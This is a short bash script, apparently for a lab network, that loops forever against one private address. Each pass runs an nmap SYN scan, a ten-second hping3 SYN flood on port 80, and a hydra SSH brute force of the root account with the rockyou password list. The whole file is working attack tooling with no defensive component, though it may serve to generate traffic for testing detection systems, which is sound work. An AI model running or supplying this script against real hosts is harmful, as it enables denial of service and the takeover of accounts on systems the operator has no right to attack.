#!/bin/bash
TARGET="192.168.56.20"
while true; do
  echo "=== Port Scan ==="
  nmap -sS $TARGET
  sleep 10
  echo "=== DDoS ==="
  hping3 -S --flood -V -p 80 $TARGET &
  sleep 10
  kill %1
  echo "=== Brute Force ==="
  hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 $TARGET ssh
  sleep 10
done